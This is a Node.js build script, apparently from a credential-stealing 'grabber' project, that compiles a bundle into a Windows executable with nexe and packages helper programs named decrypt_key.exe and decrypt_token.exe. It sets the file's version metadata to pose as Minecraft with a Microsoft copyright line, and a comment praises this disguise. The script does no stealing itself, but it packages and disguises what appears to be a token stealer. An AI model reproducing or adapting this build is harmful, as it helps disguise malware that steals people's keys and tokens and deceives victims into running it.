const { compile } = require('nexe');
const { copyFileSync } = require('fs');
const { join } = require('path');

copyFileSync(join(__dirname, 'util', 'decrypt-key', 'decrypt_key.exe'), join(__dirname, 'dist', 'decrypt_key.exe'));
copyFileSync(join(__dirname, 'util', 'decrypt-token', 'decrypt_token.exe'), join(__dirname, 'dist', 'decrypt_token.exe'));

compile({
  input: './dist/index.bundle.js',
  output: (require('./config').filename || 'grabber') + '.exe',
  build: true,
  resources: ['./dist/*.bundle.js', './dist/*.exe'],
  ico: './icon.ico',
  rc: { // This is one of the best things that exists
    CompanyName: 'Minecraft',
    ProductVersion: '1.19.60.03',
    FileVersion: '1.19.60.3',
    LegalCopyright: '© Microsoft. All rights reserved.',
    OriginalFilename: 'Minecraft',
    FileDescription: 'Minecraft',
    ProductName: 'Minecraft'
  },
  verbose: true,
  target: ['win32-x64-18.16.0']
});
